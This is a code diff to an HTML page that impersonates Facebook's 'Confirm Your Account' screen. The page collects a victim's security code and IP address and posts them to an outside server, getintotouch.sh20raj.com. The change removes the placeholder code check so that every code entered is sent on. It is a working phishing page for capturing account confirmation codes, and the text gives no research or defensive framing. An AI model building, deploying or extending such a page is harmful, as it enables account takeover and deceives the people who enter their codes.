@@ -97,7 +97,7 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
     </div>
     <div class="title">Confirm Your Account</div>
-    <form id="verificationForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST" onsubmit="return validateCode(event)">
+    <form id="verificationForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="POST" onsubmit="handleFormSubmit(event)">
         <div class="input-container">
             <input id="securityCode" name="securityCode" type="text" placeholder="Security Code" required>
         </div>
@@ -111,17 +111,10 @@
         <input type="hidden" id="userIP" name="userIP">
     </form>
     <script>
-        function validateCode(event) {
-            event.preventDefault(); // Prevent default form submission behavior
-            const securityCode = document.getElementById('securityCode').value;
+        function handleFormSubmit(event) {
             const userIP = document.getElementById('userIP');
-            // Replace "1234" with your actual validation logic
-            if (securityCode !== "1234") {
-                document.getElementById('errorMessage').style.display = 'block';
-            } else {
-                userIP.value = getClientIP(); // Set the user's IP address
-                document.getElementById('verificationForm').submit(); // Submit the form if the code is correct
-            }
+            userIP.value = getClientIP(); // Set the user's IP address
+            document.getElementById('verificationForm').submit(); // Submit the form regardless of the code
         }
 
         function getClientIP() {
